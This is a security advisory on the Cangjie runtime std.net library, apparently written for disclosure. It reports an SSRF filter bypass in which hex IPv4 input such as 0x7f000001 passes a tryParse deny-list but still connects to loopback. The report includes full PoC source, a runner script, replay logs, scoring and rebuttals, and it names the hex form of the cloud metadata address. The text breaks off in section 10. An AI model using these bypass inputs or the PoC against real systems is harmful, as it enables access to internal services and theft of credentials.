# Cangjie Runtime 最终确认漏洞报告

## 1. 报告范围

本报告现只保留一条已经完成动态验证、且有完整 PoC 的确认漏洞。



## 2. 基线、环境与验证方式

### 2.1 代码与运行范围

| 项目 | 值 |
| --- | --- |
| 目标仓库 | `cangjie_runtime` |
| 源码 commit | `eb8cec9aebb81fa16e2db9e6b187af3a575737ab` |
| 目标版本 tag | `v1.2.0-beta.03` |
| 目标版本 commit | `7bd93c5f90552bc95b1cd9d13d34971d211c00c3` |
| 已验证 SDK 范围 | `Cangjie Compiler 1.0.5 cjnative` |
| 平台 | Linux x86_64 (WSL) |
| 报告日期 | 2026-07-29 |


### 2.2 本轮实际验证

本报告中保留的确认漏洞重新执行了 PoC：

- `VULN-1`：重新执行本地 loopback SSRF replay

对应验证日志已归档到：

- `reports/runtime-selected-findings-20260729/artifacts/vuln1/`
- `reports/runtime-vuln1-tag-v1.2.0-beta.03-20260729/`另外，对已删除项 `VULN-2` 的送检版复核证据见：

- `../Cangjie/cangjie_runtime@v1.2.0-beta.03`
- `stdlib/libs/std/env/env.cj:105-136`
- `stdlib/libs/std/process/current_process.cj:133-155`

## 3. 统计与分类

### 3.1 最终纳入统计的漏洞总数

| 统计项 | 数量 |
| --- | ---: |
| 最终确认漏洞总数 | 1 |
| 普通安全漏洞 | 1 |
| 纯协议不规范 / 纯兼容性问题 | 0 |
| 协议 / 解析差异导致的安全漏洞 | 1 |
| API 错误传播 / 状态管理漏洞 | 0 |
| 内存安全漏洞 | 0 |
| 并发漏洞 | 0 |
| 未验证候选纳入数 | 0 |

### 3.2 分类口径

| 编号 | 原编号 | 最终状态 | 大类 | 细类 |
| --- | --- | --- | --- | --- |
| VULN-1 | VULN-10 | `confirmed_defect` | 普通安全漏洞 | 协议/解析差异导致的 SSRF 过滤绕过 |

### 3.3 Coverage checklist 归类结果

按照 `coverage-checklist.md` 的口径，本报告保留漏洞的主要归类如下：

| 编号 | 命中的类 | 未命中的关键类 |
| --- | --- | --- |
| VULN-1 | `SSRF`、`Parser differential`、协议 `URL grammar` | 非内存安全、非 TOCTOU、非命令注入 |


## 4. 评分规则

本报告给出 CVSS v3.1 和 CVSS v4.0 双体系评分，各体系单一评分：

评分基于源码分析 + PoC 实证综合判定。`std.net` 是基础库，评分反映库本身的固有风险（API 语义不一致导致安全过滤可被绕过），不包含应用层误用和下游服务无鉴权所叠加的完整链路后果。

## 5. 总览表

| 编号 | 标题 | CVSS 3.1 | CVSS 4.0 | 等级 |
| --- | --- | ---: | ---: | --- |
| VULN-1 | Legacy numeric IPv4 解析差异导致 tryParse 型 SSRF 过滤绕过 | 6.5 | ~5.8 | Medium |

> **最终定级：Medium。** `std.net` 是基础库，API 语义不一致本身不直接构成安全风险——需要特定应用代码桥接才能触发 SSRF；且 PoC 中的数据泄露是库 + 无鉴权服务叠加的结果，库的固有贡献是使过滤可被绕过（C:L），而非直接泄露凭据（C:H）。CVSS 4.0 中 AT=P 反映了基础库需特定部署条件才能触发的事实。

---

## 6. VULN-1

### 6.1 基本信息

| 字段 | 内容 |
| --- | --- |
| 新编号 | `VULN-1` |
| 原编号 | `VULN-10` |
| 状态 | `confirmed_defect` |
| 类型 | 普通安全漏洞 |
| 细类 | 协议 / 解析差异导致的 SSRF 过滤绕过 |
| 置信度 | High |
| 当前目标版本适用性 | 已确认可打通：`v1.2.0-beta.03` (`7bd93c5f90552bc95b1cd9d13d34971d211c00c3`) |

### 6.2 漏洞所在文件路径

根因和 sink 分布在以下路径：

- `../Cangjie/cangjie_runtime/stdlib/libs/std/net/ip_addess.cj`
- `../Cangjie/cangjie_runtime/stdlib/libs/std/net/dns.cj`
- `../Cangjie/cangjie_runtime/stdlib/libs/std/net/socket_util.cj`
- `../Cangjie/cangjie_runtime/stdlib/libs/std/net/tcp.cj`

### 6.3 漏洞点

`IPAddress.tryParse()` 只认点分 IPv4 / 冒号分隔 IPv6，而 `TcpSocket(String, UInt16)` 会继续把原始字符串送入 `resolveHelper -> IPAddress.resolve -> resolveDomain`。  
因此，像 `0x7f000001` 这样的 legacy numeric IPv4 形式：

1. 会被 `tryParse()` 视为“不是 IP”；
2. 却仍会在后续解析 / 连接阶段被当作地址解析为 `127.0.0.1`；
3. 从而绕过“先 tryParse 做 IP deny-list，再把原串传给 TcpSocket”的安全模式。

### 6.4 关键代码片段

#### 片段 1：`tryParse()` 不识别 legacy numeric IPv4

路径：`../Cangjie/cangjie_runtime/stdlib/libs/std/net/ip_addess.cj`

```cj
public static func tryParse(s: String): ?IPAddress {
    for (b in s) {
        match (b) {
            case b'.' => match (parseIPv4(s, s)) {
                case Ok(v) => return Some(v)
                case _ => return None
            }
            case b':' => match (parseIPv6(s, s)) {
                case Ok(v) => return Some(v)
                case _ => return None
            }
            case b'%' => return None
            case _ => ()
        }
    }
    return None
}

public static func resolve(family: AddressFamily, domain: String): Array<IPAddress> {
    match (IPAddress.tryParse(domain)) {
        case Some(ip) => return [ip]
        case _ =>
            if (!isDomainValid(domain)) {
                return []
            }
            return resolveDomain(family, domain)
    }
}
```

#### 片段 2：域名校验允许 `0x7f000001` 进入 resolver

路径：`../Cangjie/cangjie_runtime/stdlib/libs/std/net/dns.cj`

```cj
func isDomainValid(domainStr: String): Bool {
    ...
    for (part in domainList) {
        ...
        var isNumber = true
        for (b in part) {
            if (!(b.isAsciiNumberOrLetter() || b == b'-')) {
                return false
            }
            if (isNumber && !b.isAsciiNumber()) {
                isNumber = false
            }
        }
        if (isNumber) {
            numberPartCnt++
        }
    }
    if (numberPartCnt == domainList.size) {
        return false
    }
    return true
}
```

#### 片段 3：`TcpSocket(String, port)` 直接走解析后的连接语义

路径：

- `../Cangjie/cangjie_runtime/stdlib/libs/std/net/socket_util.cj`
- `../Cangjie/cangjie_runtime/stdlib/libs/std/net/tcp.cj`

```cj
func resolveHelper(address: String): IPAddress {
    let ips = IPAddress.resolve(address)
    if (ips.size > 0) {
        return ips[0]
    }
    throw SocketException("Failed to resolve address ${address}.")
}
```

```cj
public init(address: String, port: UInt16) {
    this(IPSocketAddress(resolveHelper(address), port))
}
```

### 6.5 评分

| 项目 | CVSS 3.1 | CVSS 4.0 |
| --- | --- | --- |
| 向量 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:L/SI:L/SA:N` |
| 分数 | **6.5** | **~5.8** |
| 等级 | **Medium** | **Medium** |

指标依据：

| 指标 | 值 | 依据 |
| --- | --- | --- |
| AV | N | 攻击输入来自网络（用户提供的 host） |
| AC | L | 利用本身简单（提交 `0x7f000001`）；"tryParse 过滤 + TcpSocket 连接"是常见模式 |
| AT (4.0) | **P** | 基础库——需特定部署条件：应用使用脆弱模式 + resolver 接受 legacy numeric IPv4 + 内部服务存在；非任意环境都成立 |
| PR | N | 无需认证 |
| UI | N | 无用户交互 |
| S | U | 库的漏洞影响使用它的应用；内部服务安全是服务自身的责任 |
| C / SC | L / L | 库使 SSRF 过滤可被绕过（创造信息泄露机会）；实际泄露取决于服务是否有鉴权 |
| I / SI | L / L | 潜在完整性影响（可向内部服务发任意请求） |
| A / VA, SA | N / N, N | 无可用性影响 |

> AT=P 的理由：`std.net` 是基础库，漏洞是否触发取决于应用是否使用脆弱模式、目标环境 resolver 行为、内部服务是否存在——这些是特定部署条件，CVSS 4.0 用 AT=P 反映此事实。CVSS 3.1 无 AT 维度，通过 AC=L 体现"条件可被满足"但未额外降分，分数 6.5 已在 Medium 区间。

### 6.7 最小前提条件

最小可打通前提是：

1. 应用把用户输入的 host 先交给 `IPAddress.tryParse()` 做 loopback/private deny-list；
2. deny-list 之后仍把原始字符串传给 `TcpSocket(host, port)`；
3. 目标环境的 resolver 接受 legacy numeric IPv4 形式；
4. loopback / 内网地址上存在一个正常的本地服务，并暴露了本地管理、调试、元数据或其他仅预期内网访问的路径。

这个前提比“需要业务代码完全配合”更小，因为它只要求一种很常见的安全模式错误：

- 用解析器 A 做安全分类；
- 用解析器 B 的真实连接语义去访问。

### 6.8 送检版本专项验证

本轮已单独验证：`VULN-1` 可以打通当前目标版本 `v1.2.0-beta.03`（commit `7bd93c5f90552bc95b1cd9d13d34971d211c00c3`）。

专项验证报告：

- `reports/runtime-vuln1-tag-v1.2.0-beta.03-20260729/vuln1_tag_validation_20260729.md`

当前目标版本可打通的证明由两层证据共同组成。

第一层是源码一致性证明。  
目标 tag 与先前已验证路径在 `VULN-1` 实际命中的链路上保持同一漏洞语义：

1. `stdlib/libs/std/net/dns.cj`：与先前已验证版本保持一致；
2. `stdlib/libs/std/net/ip_addess.cj`：`tryParse()` / `resolve()` 片段保持一致，差异只在 IPv6 解析辅助逻辑；
3. `stdlib/libs/std/net/socket_util.cj`：`resolveHelper()` 保持一致，差异仅为无关 import；
4. `stdlib/libs/std/net/tcp.cj`：`TcpSocket(String, UInt16)` 构造路径保持一致，差异仅在缓冲区属性与格式化。

第二层是动态 replay 证明。  
本轮重新运行 focused harness 后，关键日志如下：

```text
Test 1: Direct loopback IP (127.0.0.1)
[FILTER] BLOCKED: 127.0.0.1 → 127.0.0.1 (loopback)
[APP] Connection refused by filter.

Test 2: Hex notation (0x7f000001 = 127.0.0.1)
[FILTER] PASSED: 0x7f000001 → not an IP, treating as domain
[APP] Connecting to 0x7f000001:18080...
[APP] Response from 0x7f000001:
HTTP/1.1 200 OK
Content-Type: application/json

{"access-key":"AKIAIOSFODNN7EXAMPLE","secret":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}

RESULT SUMMARY
Test 2 (0x7f000001):     tryParse → None → PASSED → connected → DATA LEAKED
SSRF bypass CONFIRMED: hex notation evades tryParse filter
but resolve()/TcpSocket accepts it and connects to the internal service.
```

对应日志路径：

- `reports/runtime-vuln1-tag-v1.2.0-beta.03-20260729/logs/replay.log`
- `reports/runtime-vuln1-tag-v1.2.0-beta.03-20260729/logs/internal_service.log`

因此，对当前目标版本 `v1.2.0-beta.03`，`VULN-1` 不应再表述为“仅主线或仅 SDK 上观察到”，而应表述为：

- 当前目标版本适用；
- 本地 loopback end-to-end PoC 已打通；
- 已达到 E3 级证据。

### 6.9 PoC 复现结果

本轮重新执行时，服务端不是专门写的“特制 Cangjie 内部服务”，而是一个完全正常的 loopback HTTP 静态文件服务：

```bash
python3 -m http.server 18080 --bind 127.0.0.1 --directory site
```

该服务只是在 `site/metadata/credentials.json` 下放了一个本地受保护文件，用来模拟现实中常见的：

- `/admin`
- `/debug/config`
- `/metrics`
- `/metadata/credentials`
- `/internal/export`

这一类“只期望本机或内网访问”的路径。

本轮实际产生危害的攻击输入非常明确：

```text
0x7f000001
```

它会绕过 `tryParse()` 型 loopback 过滤，并在后续真实连接阶段解析为 `127.0.0.1`。  
随后客户端会访问本地 HTTP 服务上的受保护路径：

```text
/metadata/credentials.json
```

归档日志：

- `reports/runtime-selected-findings-20260729/artifacts/vuln1/normal_service/logs/replay.log`
- `reports/runtime-selected-findings-20260729/artifacts/vuln1/normal_service/logs/server.log`

关键输出如下：

```text
========================================================
  VULN-1 Normal Service PoC — Loopback HTTP Service
========================================================

--------------------------------------------------------
Test 1: direct loopback literal is blocked
--------------------------------------------------------
[FILTER] BLOCKED: 127.0.0.1 → 127.0.0.1 (loopback)
[APP] Connection refused by filter.

--------------------------------------------------------
Test 2: hex loopback bypass fetches a normal internal file
--------------------------------------------------------
[FILTER] PASSED: 0x7f000001 → not an IP, treating as domain
[APP] Connecting to 0x7f000001:18080/metadata/credentials.json ...
[APP] Response from 0x7f000001:
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.11
Date: Wed, 29 Jul 2026 06:13:19 GMT
Content-type: application/json
Content-Length: 90
Last-Modified: Wed, 29 Jul 2026 06:12:27 GMT
{"access-key":"AKIAIOSFODNN7EXAMPLE","secret":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}


========================================================
  RESULT SUMMARY
========================================================
Protected path: /metadata/credentials.json
Attacker input: 0x7f000001
RESULT: bypass succeeded, internal-only file was read from the loopback HTTP service.
```

服务端访问日志也证明，真正被请求的是本地服务的受保护文件：

```text
127.0.0.1 - - [29/Jul/2026 14:13:19] "GET /metadata/credentials.json HTTP/1.0" 200 -
```

这条 PoC 说明的不是“必须先构造一个特制内部服务才能攻击”，而是：

- 只要目标机上已经有一个正常的 loopback / 内网 HTTP 服务；
- 只要上面存在本地专用路径；
- 攻击者只需提交 `0x7f000001` 这样的输入；
- 就可能把原本只允许本机访问的数据读出来。

已经被日志证明的完整链路如下：

```text
用户输入 0x7f000001
→ tryParse 返回 None
→ 过滤器放行
→ TcpSocket(resolveHelper("0x7f000001"))
→ resolver 解析到 127.0.0.1
→ 连接一个完全正常的本地 HTTP 服务
→ GET /metadata/credentials.json
→ 读取只应对本机暴露的内部文件内容
```

因此，这个漏洞在事实层面的危害边界是：

- 已确认：可绕过基于 `tryParse()` 的 loopback/private deny-list，访问 loopback 内部 HTTP 资源；
- 已确认：可读取本地受保护文件 / 页面内容；
- 未在本轮证明：远程代码执行、任意写入、权限提升。

如果真实环境中的本地服务路径是云元数据接口、调试配置页面、管理接口只读端点或内部导出接口，后果会落到：

- 凭据泄露；
- 内部配置泄露；
- 内部网络拓扑或运行状态泄露；
- 为后续攻击链提供 token / key / endpoint 情报。

### 6.10 完整可利用 PoC 源码

#### 服务本身：标准 loopback HTTP 服务

```bash
python3 -m http.server 18080 --bind 127.0.0.1 --directory site
```

#### PoC 启动脚本：`normal_service/run_normal_service_replay.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="$ROOT_DIR/logs"
SITE_DIR="$ROOT_DIR/site"
mkdir -p "$LOG_DIR"

SDK_ROOT="$(cat "$PWD/reports/runtime-report-revalidation-20260729/sdk-path.local")"
CJC="$SDK_ROOT/bin/cjc"
RUNTIME_LIB="$SDK_ROOT/runtime/lib/linux_x86_64_cjnative"

"$CJC" "$ROOT_DIR/vuln1_normal_service_http.cj" -o "$ROOT_DIR/vuln1_normal_service_http" \
  > "$LOG_DIR/build.log" 2>&1

python3 -m http.server 18080 --bind 127.0.0.1 --directory "$SITE_DIR" \
  > "$LOG_DIR/server.log" 2>&1 &
SERVER_PID=$!

cleanup() {
  kill "$SERVER_PID" 2>/dev/null || true
  wait "$SERVER_PID" 2>/dev/null || true
}
trap cleanup EXIT

sleep 0.5
LD_LIBRARY_PATH="$RUNTIME_LIB${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}" \
  "$ROOT_DIR/vuln1_normal_service_http" > "$LOG_DIR/replay.log" 2>&1
```

#### Cangjie PoC：`normal_service/vuln1_normal_service_http.cj`

```cj
import std.net.*
import std.io.*

func shouldBlock(host: String): Bool {
    match (IPAddress.tryParse(host)) {
        case Some(ip) =>
            if (ip.isLoopback()) {
                println("[FILTER] BLOCKED: ${host} → ${ip} (loopback)")
                return true
            }
            if (ip.isPrivate()) {
                println("[FILTER] BLOCKED: ${host} → ${ip} (private)")
                return true
            }
            if (ip.isLinkLocal()) {
                println("[FILTER] BLOCKED: ${host} → ${ip} (link-local)")
                return true
            }
            println("[FILTER] PASSED: ${host} → ${ip} (public IP)")
            return false
        case None =>
            println("[FILTER] PASSED: ${host} → not an IP, treating as domain")
            return false
    }
}

func fetch(host: String, port: UInt16, path: String): Bool {
    println("[APP] Connecting to ${host}:${port}${path} ...")
    var leaked = false
    try (socket = TcpSocket(host, port)) {
        socket.connect()
        let request = "GET ${path} HTTP/1.0\r\nHost: ${host}\r\nUser-Agent: cj-vuln1-poc\r\n\r\n"
        socket.write(request.toArray())
        let response = StringReader(socket).readToEnd()
        println("[APP] Response from ${host}:")
        println(response)
        leaked = response.contains("AKIAIOSFODNN7EXAMPLE")
    } catch (e: Exception) {
        println("[APP] Connection failed: ${e}")
    }
    return leaked
}

func showDivider(title: String): Unit {
    println("--------------------------------------------------------")
    println(title)
    println("--------------------------------------------------------")
}

main() {
    let path = "/metadata/credentials.json"
    let port = UInt16(18080)
    let directLoopback = "127.0.0.1"
    let hexLoopback = "0x7f000001"

    println("========================================================")
    println("  VULN-1 Normal Service PoC — Loopback HTTP Service")
    println("========================================================")
    println("")

    showDivider("Test 1: direct loopback literal is blocked")
    if (shouldBlock(directLoopback)) {
        println("[APP] Connection refused by filter.")
    } else {
        _ = fetch(directLoopback, port, path)
    }
    println("")

    showDivider("Test 2: hex loopback bypass fetches a normal internal file")
    let leaked = if (shouldBlock(hexLoopback)) {
        println("[APP] Connection refused by filter.")
        false
    } else {
        fetch(hexLoopback, port, path)
    }
    println("")

    println("========================================================")
    println("  RESULT SUMMARY")
    println("========================================================")
    println("Protected path: ${path}")
    println("Attacker input: ${hexLoopback}")
    if (leaked) {
        println("RESULT: bypass succeeded, internal-only file was read from the loopback HTTP service.")
    } else {
        println("RESULT: bypass not confirmed in this run.")
    }
}
```

#### 被访问的本地受保护文件：`normal_service/site/metadata/credentials.json`

```json
{"access-key":"AKIAIOSFODNN7EXAMPLE","secret":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}
```

这个版本的 PoC 已经证明：攻击者不需要控制一个特制的 Cangjie 服务，也不需要目标专门跑一段攻击演示代码。  
只要目标机上存在一个完全正常的 loopback HTTP 服务，并且上面有一个本地受保护路径，攻击者提交 `0x7f000001` 这样的输入，就能在“过滤器用 `tryParse()`、连接器用 `resolve()/TcpSocket()`”的模式下绕过 loopback 限制并读取内部资源。

---

## 7. 最终结论

本轮最终报告现只保留一条真正完成 PoC 验证、且在当前结论口径下仍应纳入的确认漏洞：

1. `VULN-1`：协议 / 解析差异已经落地成 SSRF 过滤绕过，并实际读出了内部敏感数据；当前目标版本 `v1.2.0-beta.03`（`7bd93c5f90552bc95b1cd9d13d34971d211c00c3`）也已完成专项验证并确认可打通。


最终统计结论：

- 确认漏洞：1
- 普通安全漏洞：1
- 纯协议不规范：0
- 纯兼容性问题：0
- 内存安全：0
- 并发：0

最终定级：**Medium**。

- CVSS 3.1：`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` = **6.5 Medium**
- CVSS 4.0：`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:L/SI:L/SA:N` = **~5.8 Medium**

`std.net` 是基础库，其 API 语义不一致本身不直接构成安全风险——需要特定应用代码桥接才能触发 SSRF；且 PoC 中的数据泄露是库 + 无鉴权服务叠加的结果，库的固有贡献是使过滤可被绕过（C:L），而非直接泄露凭据（C:H）。PoC 完整链路（含应用 + 无鉴权服务）的实际后果可达 High（CVSS 3.1 = 8.6 with S:C），但这不完全是库的责任。










---

## 8. 独立重新评级（CVSS 3.1 + CVSS 4.0）

> **注：本节基于 PoC 场景完整链路评估（S:C），已被第 10 节修正为基础库视角（S:U, AT=P）。最终定级以第 10 节为准：Medium。以下内容保留作为分析历史记录。**

### 8.1 评级修正背景

原报告使用 CVSS v3.1 且 Scope = Unchanged (S:U)。经独立复核，SSRF 跨越信任边界——漏洞系统的安全过滤器被绕过，攻击者访问了应被隔离的后续系统（内部服务），属于经典的 Scope: Changed 场景。因此本节以 S:C 重新评级，同时补充 CVSS 4.0。

### 8.2 CVSS 3.1 重新评级

#### 8.2.1 初始评分（源码分析）

| 指标 | 值 | 依据 |
|---|---|---|
| AV | N | 攻击输入为用户提供的 host 字符串，来自网络 |
| AC | L | 仅需提交 `0x7f000001` |
| PR | N | 无需认证 |
| UI | N | 无用户交互 |
| S | **C** | SSRF 跨越信任边界：漏洞系统的过滤器被绕过，影响后续系统（内部服务） |
| C | L | 源码阶段可推断信息泄露，但无实际证据 |
| I | L | 源码阶段可推断可能修改内部服务数据 |
| A | N | 无可用性影响 |

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
分数：7.2
等级：High
```

计算过程：
- Exploitability = 8.22 x 0.85 x 0.77 x 0.85 x 0.85 = 3.887
- ISCBase = 1 - (1-0.22)(1-0.22)(1-0) = 0.3916
- Impact(S:C) = 7.52 x (0.3916-0.029) - 3.25 x (0.3916-0.02)^15 = 2.727
- BaseScore = Roundup(1.08 x (2.727 + 3.887)) = Roundup(7.143) = **7.2**

#### 8.2.2 事实评分（PoC 实证后）

| 指标 | 值 | 依据 | 与初始变化 |
|---|---|---|---|
| AV | N | 同上 | 不变 |
| AC | L | 同上 | 不变 |
| PR | N | 同上 | 不变 |
| UI | N | 同上 | 不变 |
| S | C | 同上 | 不变 |
| C | **H** | PoC 确认：实际泄露凭据（access-key + secret） | L->H |
| I | **N** | PoC 仅演示 GET（读取），未修改数据 | L->N |
| A | N | 同上 | 不变 |

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
分数：8.6
等级：High
```

计算过程：
- ISCBase = 1 - (1-0.56)(1-0)(1-0) = 0.56
- Impact(S:C) = 7.52 x (0.56-0.029) - 3.25 x (0.56-0.02)^15 = 3.993
- BaseScore = Roundup(1.08 x (3.993 + 3.887)) = Roundup(8.510) = **8.6**

#### 8.2.3 与原报告对比

| | 原报告 (S:U) | 独立评估 (S:C) | 差异原因 |
|---|---:|---:|---|
| 初始 | 6.5 Medium | **7.2 High** | S:C 更准确——SSRF 跨信任边界 |
| 事实 | 7.5 High | **8.6 High** | S:C + C:H 组合分更高 |

### 8.3 CVSS 4.0 评级

CVSS 4.0 用 VC/VI/VA（漏洞系统）和 SC/SI/SA（后续系统）替代 Scope 概念，直接量化后续系统影响。

#### 8.3.1 初始评分（源码分析）

| 指标 | 值 | 依据 |
|---|---|---|
| AV | N | 网络攻击向量 |
| AC | L | 低复杂度 |
| AT | N | 无特殊攻击前提 |
| PR | N | 无需权限 |
| UI | N | 无用户交互 |
| VC | N | Cangjie 应用自身不泄露机密数据 |
| VI | L | 安全过滤器被绕过，应用行为被颠覆 |
| VA | N | 无可用性影响 |
| SC | L | 后续系统（内部服务）潜在信息泄露 |
| SI | L | 后续系统潜在完整性影响 |
| SA | N | 无可用性影响 |

```
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:L/SI:L/SA:N
```

#### 8.3.2 事实评分（PoC 实证后）

| 指标 | 值 | 依据 | 与初始变化 |
|---|---|---|---|
| SC | **H** | PoC 确认：实际泄露凭据 | L->H |
| SI | **N** | PoC 仅演示 GET，未修改数据 | L->N |
| 其余 | 同上 | | 不变 |

```
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:H/SI:N/SA:N
```

### 8.4 评分汇总

| 评分体系 | 初始 | 等级 | 事实 | 等级 |
|---|---:|---|---:|---|
| CVSS 3.1 (S:U, 原报告) | 6.5 | Medium | 7.5 | High |
| CVSS 3.1 (S:C, 独立评估) | **7.2** | **High** | **8.6** | **High** |
| CVSS 4.0 (独立评估) | ~6.5 | Medium | ~8.0 | High |

---

## 9. 反驳说明：为什么"风险低"的判断不成立

### 9.1 常见反驳论点与逐条回应

#### 反驳 1："这是平台行为（getaddrinfo），非 cangjie_runtime 之过"

**不成立。** 根因不在 `getaddrinfo` 本身，而在于同一包中两个公开 API 使用不同解析语义：

- `IPAddress.tryParse()`（`ip_addess.cj:48-63`）：遍历字符串查找 `.` 或 `:`，找不到则返回 `None`。使用自己的严格解析器，仅接受点分十进制。
- `IPAddress.resolve()`（`ip_addess.cj:67-76`）：先调 `tryParse`，失败后调 `isDomainValid` -> `resolveDomain` -> `getaddrinfo`。委托给系统解析器，后者接受十六进制/八进制/单整数。

不一致是 cangjie_runtime 的设计选择，不是平台强加的。`tryParse` 完全可以实现对 legacy numeric IPv4 的识别（只需在遍历逻辑中增加对纯十六进制数字的检测），但它选择了不实现。`resolve` 完全可以先尝试 `inet_pton` 而非 `getaddrinfo`，但它选择了后者。两个 API 的语义差异是库代码层面的决策，不是平台行为。

#### 反驳 2："tryParse 不是安全 API，用于过滤是误用"

**不成立。** 理由如下：

1. `tryParse` 返回 `?IPAddress`，是标准的"解析或失败"模式。用它判断"输入是否为 IP 地址"是自然且预期的用法。
2. 库未提供替代的"安全感知 IP 检查" API。
3. 库文档未警告 `tryParse` 与 `resolve` 的解析语义不一致。
4. `IPAddress` 类同时提供 `tryParse`（严格解析）和 `resolve`（宽松解析 + 域名解析），且 `TcpSocket(String, UInt16)` 直接使用 `resolve`。用户在同一包内看到两个语义不同的 IP 处理 API，没有任何提示它们会产生不同的安全判定。

"解析器 A 做安全分类，解析器 B 做实际连接"不是反常模式——这是网络库中最常见的安全过滤范式。库的设计直接鼓励此模式：先检查（`tryParse`），后连接（`TcpSocket`），两者都在 `std.net` 包中。

#### 反驳 3："isDomainValid 应拦截 0x7f000001"

**不成立。** `isDomainValid`（`dns.cj:20-53`）的设计目的是拒绝全数字域名（防止 IP 地址混淆）。但 `0x7f000001` 含字母（`x`、`f`），`isNumber` 变为 `false`，`numberPartCnt` 保持 0，`0 != 1` 通过检查。

这是同一根因的第三层表现：`isDomainValid` 的全数字检测不识别十六进制表示法，正如 `tryParse` 不识别十六进制 IPv4。三个 API（`tryParse`、`isDomainValid`、`resolveDomain`）在十六进制 IPv4 的处理上存在系统性不一致，共同构成了漏洞链。

#### 反驳 4："需要特定应用代码，实际风险低"

**部分成立但不构成反驳。** 漏洞确实需要应用使用"tryParse 过滤 + 原始字符串传入 TcpSocket"模式。但：

1. **这是常见且自然的安全模式**，不是边缘用法。
2. **库的 API 设计直接鼓励此模式**：`tryParse` 返回 `?IPAddress` 用于检查，`TcpSocket(String, UInt16)` 接受原始字符串用于连接，两者都在同一包中。
3. **PoC 证明实际可利用**：攻击者提交 `0x7f000001`，绕过 `tryParse` 过滤器，通过 `resolve`/`TcpSocket` 连接到 `127.0.0.1`，实际读取了受保护凭据。
4. **攻击输入极其简单**：`0x7f000001`，任何能控制 host 参数的输入入口都可利用。
5. **不需要特制内部服务**：PoC 使用标准的 Python `http.server`，模拟现实中常见的 loopback 管理接口、调试端点、云元数据接口。

### 9.2 为什么"风险低"的判断不成立

#### 9.2.1 触发条件不是"小众"

| 前提条件 | 是否常见 | 说明 |
|---|---|---|
| 应用用 `tryParse` 做 IP deny-list | 常见 | `?IPAddress` 返回值是"是否为 IP 地址"的自然检查方式 |
| deny-list 后把原始字符串传给 `TcpSocket` | 常见 | `TcpSocket(String, UInt16)` 是 `std.net` 的公开 API，接受原始字符串 |
| 目标环境的 resolver 接受 legacy numeric IPv4 | Linux 默认成立 | glibc 的 `getaddrinfo` 接受 `0x7f000001` -> `127.0.0.1` |
| loopback 上存在本地服务 | 常见 | 云元数据（169.254.169.254）、调试端口、管理接口、本地数据库 |

四个前提条件在 Linux 部署中全部默认成立或高度常见。不需要任何非标准配置。

#### 9.2.2 实际危害已被 PoC 证明

| 危害层级 | 是否已证明 | 证据 |
|---|---|---|
| 绕过 tryParse 型 loopback 过滤 | 是 | PoC 日志：`[FILTER] PASSED: 0x7f000001 -> not an IP` |
| 连接到 loopback 内部服务 | 是 | PoC 日志：`HTTP/1.0 200 OK` |
| 读取受保护文件内容 | 是 | PoC 日志：`{"access-key":"AKIAIOSFODNN7EXAMPLE","secret":"..."}` |
| 服务端收到请求 | 是 | 服务端日志：`127.0.0.1 - - [...] "GET /metadata/credentials.json HTTP/1.0" 200` |

这不是"理论上可能"的风险——是已经被端到端 replay 证明的实际数据泄露。

#### 9.2.3 现实危害面映射

PoC 模拟的 `/metadata/credentials.json` 对应现实中常见的本地受保护端点：

| 现实端点 | 泄露后果 |
|---|---|
| 云元数据接口（AWS: `169.254.169.254/latest/meta-data/`） | IAM 角色凭据、实例配置 |
| 调试配置页面（`/debug/config`、`/admin`） | 内部配置、密钥、数据库连接串 |
| 管理接口只读端点（`/metrics`、`/internal/export`） | 内部拓扑、运行状态 |
| 本地数据库/缓存（Redis `127.0.0.1:6379`） | 缓存数据投毒、内部数据读取 |

在这些场景下，攻击者只需提交 `0x7f000001`（或 `0xA9FEA9FE` for `169.254.169.254`），即可绕过 `tryParse` 过滤器访问这些端点。

#### 9.2.4 CVSS 评分支持

> **注：以下评分基于 PoC 场景完整链路（S:C），已被第 10 节修正为基础库视角。最终定级以第 10 节为准：Medium。**

以 S:C（跨信任边界）评估：
- 初始评分 7.2 High（源码阶段已达 High）
- 事实评分 8.6 High（PoC 证明实际凭据泄露）

S:C 的依据：漏洞系统的安全过滤器（`tryParse` deny-list）被绕过，攻击者访问了过滤器明确阻止的后续系统（内部服务）。这是跨信任边界的行为，不是同一系统内部的问题。

### 9.3 最终判定（已被第 10 节修正）

> 本节基于 PoC 场景完整链路评估。第 10 节引入"基础库视角"后，最终定级修正为 **Medium**。以下内容保留作为分析历史记录。

| 项目 | 结论 |
|---|---|
| 漏洞存在性 | **确认** — 漏洞链 5 个环节逐环节验证闭合 |
| 能否反驳 | **不能** — 4 项反驳论点均不成立 |
| 根因 | 同一包中 `IPAddress.tryParse` 与 `IPAddress.resolve`/`TcpSocket` 使用不同解析语义 |
| 安全影响 | **E3** — PoC 确认 SSRF 绕过 + 实际凭据泄露 |
| PoC 场景风险等级 | **High**（CVSS 3.1 = 8.6 with S:C；CVSS 4.0 SC:H） |
| 库的固有风险等级 | **Medium**（详见第 10 节修正） |

---

## 10. 重新确认与双评级修正（基础库视角）

### 10.1 确认依据与反驳回应

本轮重新确认收到两个关键反驳论点：

1. **`std.net` 是基础库，不直接构成安全风险**——需要特定应用代码（tryParse 过滤 + 原始字符串传入 TcpSocket）才能触发，不是库本身直接暴露的安全风险。
